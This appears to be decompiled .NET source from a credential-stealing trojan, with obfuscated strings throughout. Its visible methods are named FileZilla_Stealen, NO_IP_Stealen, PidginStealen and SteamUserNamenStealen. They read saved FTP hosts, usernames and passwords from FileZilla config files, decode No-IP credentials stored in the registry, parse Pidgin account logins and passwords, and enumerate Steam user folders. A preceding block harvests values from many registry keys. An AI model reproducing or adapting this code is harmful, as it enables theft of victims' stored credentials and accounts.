						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("]šɪ\u0363Ѷլ٪ݤ\u0875"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_625f;
						}
						goto IL_62b9;
						IL_625f:
						num = 535;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("XŢɧ\u036cѻկٯݣ\u0870सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("]šɪ\u0363Ѷլ٪ݤ\u0875"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_62b9;
						IL_62b9:
						num = 537;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱳᵇṆὁ\u206cⅧ≮⌼\u2452╴♺✶⡋⥂⩘⭄ⱔⵗ\u2e7f⽳\u302fㅊ㉛㍈㐫㕋㙼㝼㡯㥩㩷㭘㰲㴬㸱"), GClass0.smethod_0("BŪɩ\u0364ѿտٸݨ\u087c८੩୫\u0c47൬\u0e66ཤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_62ec;
						}
						goto IL_6346;
						IL_62ec:
						num = 538;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("AřɃ\u0355єվ٬ܮࡉग़\u0a4fପ\u0c48ൽ\u0e73\u0f6e\u106aᅶሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱳᵇṆὁ\u206cⅧ≮⌼\u2452╴♺✶⡋⥂⩘⭄ⱔⵗ\u2e7f⽳\u302fㅊ㉛㍈㐫㕋㙼㝼㡯㥩㩷㭘㰲㴬㸱"), GClass0.smethod_0("BŪɩ\u0364ѿտٸݨ\u087c८੩୫\u0c47൬\u0e66ཤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6346;
						IL_6346:
						num = 540;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴵ⸬⼱"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_6379;
						}
						goto IL_63d3;
						IL_6379:
						num = 541;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄰራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴵ⸬⼱"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_63d3;
						IL_63d3:
						num = 543;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴵ⸬⼱"), GClass0.smethod_0("Uţɢ\u0347Ѭզ٤"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_6406;
						}
						goto IL_6460;
						IL_6406:
						num = 544;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄰራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴵ⸬⼱"), GClass0.smethod_0("Uţɢ\u0347Ѭզ٤"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6460;
						IL_6460:
						num = 546;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴵ⸬⼱"), GClass0.smethod_0("DũɨʹѢլٸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_6493;
						}
						goto IL_64ed;
						IL_6493:
						num = 547;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄰራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴵ⸬⼱"), GClass0.smethod_0("DũɨʹѢլٸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_64ed;
						IL_64ed:
						num = 549;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴴ⸬⼱"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_6520;
						}
						goto IL_657a;
						IL_6520:
						num = 550;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄱራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴴ⸬⼱"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_657a;
						IL_657a:
						num = 552;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴴ⸬⼱"), GClass0.smethod_0("Uţɢ\u0347Ѭզ٤"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_65ad;
						}
						goto IL_6607;
						IL_65ad:
						num = 553;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄱራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴴ⸬⼱"), GClass0.smethod_0("Uţɢ\u0347Ѭզ٤"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6607;
						IL_6607:
						num = 555;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴴ⸬⼱"), GClass0.smethod_0("DũɨʹѢլٸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_663a;
						}
						goto IL_6694;
						IL_663a:
						num = 556;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EŻɧ\u0361ѥտ٣ݬ\u087bज़\u0a31ଫఴസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴴ⸬⼱"), GClass0.smethod_0("DũɨʹѢլٸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6694;
						IL_6694:
						num = 558;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴻ⸬⼱"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_66c7;
						}
						goto IL_6721;
						IL_66c7:
						num = 559;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄾራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴻ⸬⼱"), GClass0.smethod_0("]Ŵɣͷъբٯݤ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6721;
						IL_6721:
						num = 561;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴻ⸬⼱"), GClass0.smethod_0("ZŻɧ\u0363ѳզ\u0670\u0748ࡧॸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_6754;
						}
						goto IL_67ae;
						IL_6754:
						num = 562;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄾራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴻ⸬⼱"), GClass0.smethod_0("ZŻɧ\u0363ѳզ\u0670\u0748ࡧॸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_67ae;
						IL_67ae:
						num = 564;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴻ⸬⼱"), GClass0.smethod_0("DũɨʹѢլٸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_67e1;
						}
						goto IL_683b;
						IL_67e1:
						num = 565;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cţɻͱцբ\u064d\u0745\u087b१\u0a61\u0b65౿\u0d63\u0e6c\u0f7bၛᄾራጴᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑳᕽ᙮ᝮ\u1879ᥥ\u1a73ᭉ᱀ᵦṼὴ⁅ⅿ≒⍘⑸╢♦❠⡼⥮⩣⭶ⱘⴻ⸬⼱"), GClass0.smethod_0("DũɨʹѢլٸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_683b;
						IL_683b:
						num = 567;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4c᱁ᵻṡὠ⁸Ⅵ≯⍼\u245b║♬❪⡢⥯⩱"), GClass0.smethod_0("uţɢ\u036aѢկ٤"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_686e;
						}
						goto IL_68c8;
						IL_686e:
						num = 568;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("CźɼͰѽտخܥ\u0859ॸ੯\u0b7b౦൦\u0e6bའ\u102dᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4c᱁ᵻṡὠ⁸Ⅵ≯⍼\u245b║♬❪⡢⥯⩱"), GClass0.smethod_0("uţɢ\u036aѢկ٤"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_68c8;
						IL_68c8:
						num = 570;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4c᱁ᵻṡὠ⁸Ⅵ≯⍼\u245b║♬❪⡢⥯⩱"), GClass0.smethod_0("tŠɣ\u0368ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_68fb;
						}
						goto IL_6955;
						end_IL_0000_2:
						break;
					}
					num = 574;
					text2 = text;
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 29340;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			string result = text2;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public string FileZilla_Stealen()
		{
			string text = null;
			try
			{
				string[] array = Strings.Split(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("@ŝɳ\u0375ѽՍٿݹ\u0878ॲ\u0a4e\u0b63\u0c75൬\u0e6bལၸᅸቯ፻ᑾᕢᙴ\u1776ᠪ\u197b\u1a6f\u1b6d")), GClass0.smethod_0("\u000fċ"), -1, (CompareMethod)0);
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					if (text2.Contains(GClass0.smethod_0(":ōɫͰѶԿ")))
					{
						text = text + GClass0.smethod_0("JŢɦ\u036cђծ٪ݩࡥसਸ\u0b3a") + Strings.Split(text2.Replace(GClass0.smethod_0(";ĩɍ\u036bѰնؿ"), GClass0.smethod_0("")), GClass0.smethod_0("?"), -1, (CompareMethod)0)[1];
					}
					if (text2.Contains(GClass0.smethod_0(":Őɷ\u0366ѰԿ")))
					{
						text = text + GClass0.smethod_0("8ĸȺ") + Strings.Split(text2.Replace(GClass0.smethod_0(";ĩɐͷѦհؿ"), GClass0.smethod_0("")), GClass0.smethod_0("?"), -1, (CompareMethod)0)[1];
					}
					if (text2.Contains(GClass0.smethod_0(":ŕɥͰѱԿ")))
					{
						text = text + GClass0.smethod_0("8ĸȺ") + Strings.Split(text2.Replace(GClass0.smethod_0(";ĩɕ\u0365Ѱձؿ"), GClass0.smethod_0("")), GClass0.smethod_0("?"), -1, (CompareMethod)0)[1] + GClass0.smethod_0("}ĩɿ");
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string[] array3 = Strings.Split(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("FşɱͻѳՏٽݿ\u087e॰\u0a4c\u0b7c౧൹\u0e69ས\u106bᅧቩ፠ᑣᕷᘪ\u177bᡯᥭ")), GClass0.smethod_0("\u000fċ"), -1, (CompareMethod)0);
				string[] array4 = array3;
				foreach (string text3 in array4)
				{
					if (text3.Contains(GClass0.smethod_0(":ōɫͰѶԿ")))
					{
						text = text + GClass0.smethod_0("JŢɦ\u036cђծ٪ݩࡥसਸ\u0b3a") + Strings.Split(text3.Replace(GClass0.smethod_0(";ĩɍ\u036bѰնؿ"), GClass0.smethod_0("")), GClass0.smethod_0("?"), -1, (CompareMethod)0)[1];
					}
					if (text3.Contains(GClass0.smethod_0(":Őɷ\u0366ѰԿ")))
					{
						text = text + GClass0.smethod_0("8ĸȺ") + Strings.Split(text3.Replace(GClass0.smethod_0(";ĩɐͷѦհؿ"), GClass0.smethod_0("")), GClass0.smethod_0("?"), -1, (CompareMethod)0)[1];
					}
					if (text3.Contains(GClass0.smethod_0(":ŕɥͰѱԿ")))
					{
						text = text + GClass0.smethod_0("8ĸȺ") + Strings.Split(text3.Replace(GClass0.smethod_0(";ĩɕ\u0365Ѱձؿ"), GClass0.smethod_0("")), GClass0.smethod_0("?"), -1, (CompareMethod)0)[1] + GClass0.smethod_0("}ĩɿ");
					}
				}
				return text;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return text;
			}
		}

		public string NO_IP_Stealen()
		{
			string text = null;
			try
			{
				text = GClass0.smethod_0("JŬɋ\u0351");
				text = Conversions.ToString(Operators.ConcatenateObject((object)text, Operators.ConcatenateObject(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑘᕐᙁᝃᡒ᥀ᩔ\u1b4c᱙ᵧṹὭ\u2067ⅽ≬⍺⑬╵♙❀⡖⥁⩝"), GClass0.smethod_0("]ŴɣͷѪբٯݤ"), (object)null), (object)GClass0.smethod_0("8ĸȺ"))));
				return text + FromBase64(Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑘᕐᙁᝃᡒ᥀ᩔ\u1b4c᱙ᵧṹὭ\u2067ⅽ≬⍺⑬╵♙❀⡖⥁⩝"), GClass0.smethod_0("XŦɵͶѳլ\u0670ݥ"), (object)null))) + GClass0.smethod_0("=ĿȿͽЩտ");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private string FromBase64(string sText)
		{
			byte[] bytes = Convert.FromBase64String(sText);
			return Encoding.Default.GetString(bytes);
		}

		public string PidginStealen()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			int num5 = default(int);
			string text = default(string);
			string text2 = default(string);
			string path = default(string);
			string[] array = default(string[]);
			string text3 = default(string);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 490:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_002b;
							case 4:
								goto IL_0030;
							case 5:
								goto IL_0060;
							case 6:
								goto IL_0078;
							case 9:
								goto IL_00c2;
							case 10:
							case 11:
								goto IL_00fe;
							case 12:
								goto IL_0114;
							case 13:
								goto IL_0150;
							case 14:
								goto IL_0156;
							case 7:
							case 8:
								goto IL_015f;
							case 15:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 16:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0150:
						num5 = checked(num5 + 1);
						goto IL_0156;
						IL_0114:
						num = 12;
						text = text + Strings.Split(Strings.Split(text2, GClass0.smethod_0("6Źɩʹѵղ٫ݱࡦ\u093f"), -1, (CompareMethod)0)[1], GClass0.smethod_0("7ĥɹ\u0369Ѵյٲݫ\u0871०\u0a3f"), -1, (CompareMethod)0)[0] + GClass0.smethod_0("=ĿȿͽЩտ");
						goto IL_0150;
						IL_0009:
						num = 2;
						path = Interaction.Environ(GClass0.smethod_0("fŶɵ\u0360Ѣն٠")) + GClass0.smethod_0("Iĺɣ\u0367ѣՠ٣ݫࡑ७੨୩౦ൽ\u0e69\u0f72ၶᄪቻ፯ᑭ");
						goto IL_002b;
						IL_002b:
						num = 3;
						text = null;
						goto IL_0030;
						IL_0030:
						num = 4;
						array = Strings.Split(File.ReadAllText(path), GClass0.smethod_0("\u000fċ"), -1, (CompareMethod)0);
						num5 = 0;
						goto IL_004f;
						IL_004f:
						if (num5 >= array.Length)
						{
							break;
						}
						text2 = array[num5];
						goto IL_0060;
						IL_0156:
						num = 14;
						goto IL_004f;
						IL_0060:
						num = 5;
						if (text2.Contains(GClass0.smethod_0("2Žɾ\u0364Ѿզ٫ݨࡪ\u093bੴୱ\u0c72൭")))
						{
							goto IL_0078;
						}
						goto IL_015f;
						IL_0078:
						num = 6;
						text = text + GClass0.smethod_0("Yšɣ\u0361Ѭժظ\u0738࠺") + Strings.Split(Strings.Split(text2, GClass0.smethod_0("6Źɺ\u0368Ѳժ٧ݬ\u086e\u093f"), -1, (CompareMethod)0)[1], GClass0.smethod_0("7ĥɹͺѨղ٪ݧ\u086c८\u0a3f"), -1, (CompareMethod)0)[0] + GClass0.smethod_0("8ĸȺ");
						goto IL_015f;
						IL_015f:
						num = 8;
						if (text2.Contains(GClass0.smethod_0(":ūɥ\u036eѧԿ")))
						{
							goto IL_00c2;
						}
						goto IL_00fe;
						IL_00c2:
						num = 9;
						text = text + Strings.Split(Strings.Split(text2, GClass0.smethod_0(":ūɥ\u036eѧԿ"), -1, (CompareMethod)0)[1], GClass0.smethod_0(";ĩɫ\u0365Ѯէؿ"), -1, (CompareMethod)0)[0] + GClass0.smethod_0("8ĸȺ");
						goto IL_00fe;
						IL_00fe:
						num = 11;
						if (text2.Contains(GClass0.smethod_0("6Źɩʹѵղ٫ݱࡦ\u093f")))
						{
							goto IL_0114;
						}
						goto IL_0150;
						end_IL_0000_2:
						break;
					}
					num = 15;
					text3 = text + GClass0.smethod_0("\tĉȏ\u030b");
					break;
					end_IL_0000:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 490;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_3:
				break;
			}
			string result = text3;
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public object SteamUserNamenStealen()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			int num5 = default(int);
			string text = default(string);
			DirectoryInfo directoryInfo = default(DirectoryInfo);
			DirectoryInfo directoryInfo2 = default(DirectoryInfo);
			DirectoryInfo[] directories = default(DirectoryInfo[]);
			object obj = default(object);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 230:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_000e;
							case 4:
								goto IL_0035;
							case 5:
								goto IL_004b;
							case 6:
								goto IL_0067;
							case 7:
								goto IL_008b;
							case 8:
								goto IL_0091;
							case 9:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 10:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_008b:
						num5 = checked(num5 + 1);
						goto IL_0091;
						IL_0067:
						num = 6;
						text = text + GClass0.smethod_0("Aťɵ\u036eѣԭـݤ\u086dॠ੦୩౧൨\u0e61༸\u1038ᄺ") + directoryInfo.get_Name() + GClass0.smethod_0("1ĳȳ\u032aнԿؿݽ\u0829ॿ");
						goto IL_008b;
						IL_0009:
						num = 2;
						text = null;
						goto IL_000e;
						IL_000e:
						num = 3;
						directoryInfo2 = new DirectoryInfo(Interaction.Environ(GClass0.smethod_0("|Źɥ\u036eѺզ٫ݣ\u086d९੧୲")) + GClass0.smethod_0("LŜɺ\u0368ѭզ\u0656ݚ\u087c\u0962੧୨\u0c65൳\u0e72\u0f72"));
						goto IL_0035;
						IL_0035:
						num = 4;
						directories = directoryInfo2.GetDirectories();
						num5 = 0;
						goto IL_0094;
						IL_0094:
						if (num5 >= directories.Length)
						{
							break;
						}
						directoryInfo = directories[num5];
						goto IL_004b;
						IL_0091:
						num = 8;
						goto IL_0094;
						IL_004b:
						num = 5;
